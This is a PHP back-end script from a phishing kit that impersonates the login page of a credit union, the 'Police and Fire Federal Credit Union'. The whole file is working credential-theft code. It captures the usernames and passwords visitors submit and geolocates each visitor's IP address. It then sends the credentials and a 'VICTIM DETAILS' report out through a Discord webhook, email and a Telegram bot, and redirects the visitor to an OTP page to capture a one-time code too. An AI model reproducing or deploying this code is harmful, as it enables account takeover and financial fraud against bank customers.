<?php

session_start();
include 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];

    // Set a cookie for the username (expires in 7 days)
    setcookie('username', $username, time() + (7 * 24 * 60 * 60), "/"); // "/" makes it available site-wide


 $password = $_POST['password'];

    // Set a cookie for the username (expires in 7 days)
    setcookie('password', $password, time() + (7 * 24 * 60 * 60), "/"); // "/" makes it available site-wide



}


# Debug 

if($settings['debug'] == "1"){
  error_reporting(E_ALL);
  ini_set('display_errors', '1');
  ini_set('display_startup_errors', '1');
}


// # Check Username and Password are Not Empty
// if(empty($_SESSION['password']) || !isset($_SESSION['password'])){
//   exit(header("Location: ../password.php"));
//   die();
// }



# Allow URL Open

ini_set('allow_url_fopen',1);



# Fucntions

function getTimeZoneFromIpAddress(){
  $clientsIpAddress = get_client_ip();
  $clientInformation = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$clientsIpAddress));
  $clientsLatitude = $clientInformation['geoplugin_latitude'];
  $clientsLongitude = $clientInformation['geoplugin_longitude'];
  $clientsCountryCode = $clientInformation['geoplugin_countryCode'];
  $clientsCountryName = $clientInformation['geoplugin_countryName'];
  $clientsRegionCode = $clientInformation['geoplugin_regionCode'];
  $clientsRegionName = $clientInformation['geoplugin_regionName'];
  $timeZone = get_nearest_timezone($clientsLatitude, $clientsLongitude, $clientsCountryCode) ;
  return array($timeZone, $clientsRegionCode, $clientsRegionName, $clientsCountryName, $clientsCountryCode);
}

$array = getTimeZoneFromIpAddress();

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


function get_nearest_timezone($cur_lat, $cur_long, $country_code = '') {
    $timezone_ids = ($country_code) ? DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, $country_code)
        : DateTimeZone::listIdentifiers();

    if($timezone_ids && is_array($timezone_ids) && isset($timezone_ids[0])) {

        $time_zone = '';
        $tz_distance = 0;

        //only one identifier?
        if (count($timezone_ids) == 1) {
            $time_zone = $timezone_ids[0];
        } else {

            foreach($timezone_ids as $timezone_id) {
                $timezone = new DateTimeZone($timezone_id);
                $location = $timezone->getLocation();
                $tz_lat   = $location['latitude'];
                $tz_long  = $location['longitude'];

                $theta    = $cur_long - $tz_long;
                $distance = (sin(deg2rad($cur_lat)) * sin(deg2rad($tz_lat)))
                    + (cos(deg2rad($cur_lat)) * cos(deg2rad($tz_lat)) * cos(deg2rad($theta)));
                $distance = acos($distance);
                $distance = abs(rad2deg($distance));
                // echo '<br />'.$timezone_id.' '.$distance;

                if (!$time_zone || $tz_distance > $distance) {
                    $time_zone   = $timezone_id;
                    $tz_distance = $distance;
                }

            }
        }
        return $time_zone;
    }
    return 'unknown';
}

$IP = get_client_ip();

function get_ip1($ip2) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function get_ip2($ip) {
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}


function getOS($useragent) {
  $os_platform = "Unknown OS Platform";
  $os_array = array('/windows nt 10/i' => 'Windows 10','/windows nt 6.3/i' => 'Windows 8.1','/windows nt 6.2/i' => 'Windows 8','/windows nt 6.1/i' => 'Windows 7','/windows nt 6.0/i' => 'Windows Vista','/windows nt 5.2/i' => 'Windows Server 2003/XP x64','/windows nt 5.1/i' => 'Windows XP','/windows xp/i' => 'Windows XP','/windows nt 5.0/i' => 'Windows 2000','/windows me/i' => 'Windows ME','/win98/i' => 'Windows 98','/win95/i' => 'Windows 95','/win16/i' => 'Windows 3.11','/macintosh|mac os x/i' => 'Mac OS X','/mac_powerpc/i' => 'Mac OS 9','/linux/i' => 'Linux','/ubuntu/i' => 'Ubuntu','/iphone/i' => 'iPhone','/ipod/i' => 'iPod','/ipad/i' =>  'iPad','/android/i' => 'Android','/blackberry/i' =>  'BlackBerry','/webos/i' => 'Mobile');
  foreach ($os_array as $regex => $value) {
    if (preg_match($regex, $useragent)) {
      $os_platform = $value;
    }
  }
  return $os_platform;
}

function getBrowser($useragent) {
    $browser = "Unknown Browser";
    $browser_array = array('/msie/i' => 'Internet Explorer','/firefox/i' => 'Firefox','/safari/i' => 'Safari','/chrome/i' => 'Chrome','/opera/i' => 'Opera','/netscape/i' => 'Netscape','/maxthon/i' => 'Maxthon','/konqueror/i' => 'Konqueror','/mobile/i' => 'Handheld Browser');
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

# Variables

$details = get_ip1($IP);
$details = json_decode($details, true);
$countryname = $details['geoplugin_countryName'];
$countrycode = $details['geoplugin_countryCode'];
$continent = $details['geoplugin_continentName'];
$city = $details['geoplugin_city'];
$regioncity = $details['geoplugin_region'];
$timezone = $details['geoplugin_timezone'];
$currency = $details['geoplugin_currencySymbol_UTF8'];

$details2 = get_ip2($IP);
$details2 = json_decode($details2);
$isp = $details2->{'isp'};
$lat = $details2->{'lat'};
$lon = $details2->{'lon'};
$ip_type = $details2->{'ipType'};
$ip_name = $details2->{'ipName'};
$region = $details2->{'region'};


if($countryname == "") {
    $details = get_ip2($IP);
    $details = json_decode($details, true);
    $countryname = $details['country'];
    $countrycode = $details['countryCode'];
    $continent = $details['continent'];
    $city = $details['city'];
}


$username = $_POST['username'];
$password = $_POST['password'];


$hostname = gethostbyaddr($IP);
$IPV6 = "N/A ❌";


$useragent = $_SERVER['HTTP_USER_AGENT'];
$timezone = $array[0];
$date = date("h:i:s d/m/Y");
$city = $city;
$currency = $currency;
$countrycode = $countrycode;
$countryname = $countryname;
$continent = $continent;
$regioncity = $regioncity;
$currency = $currency;
$os = getOS($useragent);
$browser = getBrowser($useragent);





# Logs 

$message = "[ ❤️ 𝐏𝐨𝐥𝐢𝐜𝐞 𝐚𝐧𝐝 𝐅𝐢𝐫𝐞 𝐅𝐞𝐝𝐞𝐫𝐚𝐥 𝐂𝐫𝐞𝐝𝐢𝐭 𝐔𝐧𝐢𝐨𝐧 | CLIENT : {$client} ❤️ ]\n\n";
$message .= "********** [ 💻 LOGIN DETAILS 💻 ] **********\n";
$message .= "# USER ID   : $username \n";
$message .= "# PASSWORD   : $password \n";
$message .= "----------------------------\n";
$message .= "********** [ 🌍 BROWSER DETAILS 🌍 ] **********\n";
$message .= "# USERAGENT  : {$useragent}\n";
$message .= "# BROWSER    : {$browser}\n";
$message .= "# OS         : {$os}\n";
$message .= "----------------------------\n";
$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "# LONGITUDE  : {$lon}\n";
$message .= "# LATITUDE   : {$lat}\n";
$message .= "# CITY(IP)   : {$city}\n";
$message .= "# TIMEZONE   : {$timezone}, {$exact}\n";
$message .= "# IP TYPE    : {$ip_type}\n";
$message .= "# COUNTRY    : {$countryname}, {$countrycode}\n";
$message .= "# REGION     : {$region}\n";
$message .= "# DATE       : {$date}\n";
$message .= "# ISP        : {$isp}\n";
$message .= "----------------------------\n";
$message .= "--Host and Developer https://t.me/BTCETHADMIN --\n";
$message .= "**********************************************\n";

# Send Mail
#discord 


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Discord webhook URL
    $webhook_url = "$discord_webhook";

    // The message to send
 


    
    // Prepare the payload
    $data = json_encode([
        "content" => $message,
    ]);

    // Initialize cURL
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Skip SSL certificate verification
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // Skip host verification
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
    ]);

    // Execute the request
    $response = curl_exec($ch);

    // Check for errors
    if (curl_errno($ch)) {
        echo "Error: " . curl_error($ch);
    } else {
        echo "Message sent successfully: " . $response;
    }

}



   $to = $email;
  $headers = "Content-type:text/plain;charset=UTF-8\r\n";
  $headers .= "From: @BTCETHadmin PAGE <𝐏𝐨𝐥𝐢𝐜𝐞 𝐚𝐧𝐝 𝐅𝐢𝐫𝐞 𝐅𝐞𝐝𝐞𝐫𝐚𝐥 𝐂𝐫𝐞𝐝𝐢𝐭 𝐔𝐧𝐢𝐨𝐧  @client_{$client}_site.com>\r\n";
  $subject = " @BTCETHadmin  ✦ 𝐏𝐨𝐥𝐢𝐜𝐞 𝐚𝐧𝐝 𝐅𝐢𝐫𝐞 𝐅𝐞𝐝𝐞𝐫𝐚𝐥 𝐂𝐫𝐞𝐝𝐢𝐭 𝐔𝐧𝐢𝐨𝐧   ✦ LOGIN✦ CLIENT #{$client} ✦ {$IP} ";
  $msg = $message;
  mail($to, $subject, $msg, $headers);


 # Send Bot
$url = "https://api.telegram.org/bot" . $telegram_bot_api . "/sendMessage?chat_id=" . $telegram_chat_id . "&text=". urlencode($subject.$message);
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$result = curl_exec($ch);
curl_close($ch);


if (defined('double_login') && double_login === 'on') {
    header('Location: ../auth.php?auth=' . md5('@BTCETHadmincoder'));
    exit;
} else {
    header('Location: ../otp.php');
    exit;
}


?>
